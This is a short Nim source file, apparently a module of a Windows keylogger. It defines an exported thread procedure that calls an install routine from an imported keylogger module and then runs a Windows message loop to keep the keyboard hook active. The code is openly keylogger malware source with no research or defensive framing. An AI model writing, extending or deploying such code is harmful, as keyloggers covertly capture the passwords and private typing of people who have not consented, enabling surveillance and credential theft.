import winim
import ../functions/keylogger

proc initKeyloggerThread*(): void {.thread.} =
  install()

  var msg: MSG

  while GetMessage(addr msg, 0, 0, 0):
    TranslateMessage(addr msg)
    DispatchMessage(addr msg)
